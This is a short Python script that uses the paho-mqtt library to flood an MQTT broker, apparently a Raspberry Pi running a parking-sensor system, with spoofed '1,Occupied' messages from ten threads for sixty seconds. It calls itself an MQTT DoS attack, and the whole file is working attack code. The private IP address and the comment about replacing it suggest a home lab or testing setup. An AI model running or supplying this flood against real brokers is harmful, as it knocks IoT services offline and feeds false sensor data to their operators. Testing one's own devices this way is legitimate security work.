import paho.mqtt.client as mqtt
import threading
import time

BROKER = "10.0.0.165"  # Replace with your Pi's IP
TOPIC = "parking/sensor"
DURATION = 60  # Attack duration in seconds

client = mqtt.Client()
client.connect(BROKER, 1883, 60)

# Event to signal threads to stop
stop_event = threading.Event()

def flood():
    while not stop_event.is_set():
        client.publish(TOPIC, "1,Occupied")
        time.sleep(0.005)

# Start flooding threads
threads = []
for _ in range(10):
    t = threading.Thread(target=flood)
    t.start()
    threads.append(t)

print(f"MQTT DoS attack launched. Running for {DURATION} seconds...")
time.sleep(DURATION)

# Stop all threads
stop_event.set()
for t in threads:
    t.join()

print("MQTT DoS attack completed and stopped.")
